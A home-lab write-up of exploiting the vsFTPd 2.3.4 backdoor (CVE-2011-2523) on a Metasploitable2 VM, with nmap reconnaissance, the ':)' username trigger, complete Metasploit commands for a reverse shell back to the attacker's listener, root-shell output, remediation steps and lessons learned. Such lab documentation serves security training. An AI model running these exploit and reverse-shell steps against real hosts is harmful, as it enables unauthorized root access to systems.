# Lab 01: vsFTPd 2.3.4 Backdoor Command Execution

**Date:** 2026-10-02
**Platform:** Home Lab (VirtualBox)
**Difficulty:** Easy
**Target:** Metasploitable2 — 192.168.56.102
**Attacker:** Kali Linux — 192.168.56.101
**Skill Focus:** Enumeration · Exploitation · Post-Exploitation

---

## Objective

Gain unauthorized root access to a Metasploitable2 target by
exploiting a known backdoor in the vsFTPd 2.3.4 service.

## Reconnaissance

Performed a service/version scan against the target:

    nmap -sS -sV -O 192.168.56.102

Key findings:

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 2.3.4 |
| 22/tcp | open | ssh | OpenSSH 4.7p1 |
| 80/tcp | open | http | Apache httpd 2.2.8 |

The vsftpd 2.3.4 version immediately stands out — it contains a
malicious backdoor introduced into the source code in 2011.

## Enumeration

The vsFTPd 2.3.4 backdoor (CVE-2011-2523) is triggered when a
username containing the string `:)` is sent during FTP authentication.
When triggered, the service opens a root shell listener on port 6200
on the target — no authentication required.

Key takeaway: version number alone can reveal a critical vulnerability.
Always fingerprint services.

## Exploitation

Using the Metasploit Framework:

    msfconsole
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.102
    set RPORT 21
    set PAYLOAD cmd/unix/reverse
    set LHOST 192.168.56.101
    set LPORT 4444
    run

Successful output:

    [+] 192.168.56.102:21 - Backdoor has been spawned!
    [*] Command shell session 1 opened
        (192.168.56.101:4444 -> 192.168.56.102:45766)

## Post-Exploitation

Verified root-level access:

    whoami
    root

    id
    uid=0(root) gid=0(root)

Impact: Full system compromise. Any attacker with network access to
port 21 can gain root with zero authentication.

## Remediation

- Upgrade vsFTPd to version 2.3.5 or later (backdoor removed)
- Use SFTP over SSH instead of FTP where possible
- Firewall port 21 to trusted networks only
- Monitor for FTP usernames containing `:)` or other anomalies
- Isolate FTP services from critical assets via network segmentation

## Lessons Learned

- Enumeration pays off. Spotting the exact service version during
  reconnaissance directly led to the exploit path.
- Metasploit option discipline. RHOSTS/RPORT = target;
  LHOST/LPORT = callback listener. Always run `show options`
  before `run` to catch missing required fields.
- Network prerequisites matter. Even the perfect exploit fails if
  the target VM is unreachable. `ping` and `ifconfig` are part of
  the workflow, not an afterthought.
- Root access was trivial. This is why supply-chain attacks like
  this are so dangerous — one malicious commit compromised every
  downstream installation.

## References

- CVE-2011-2523: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
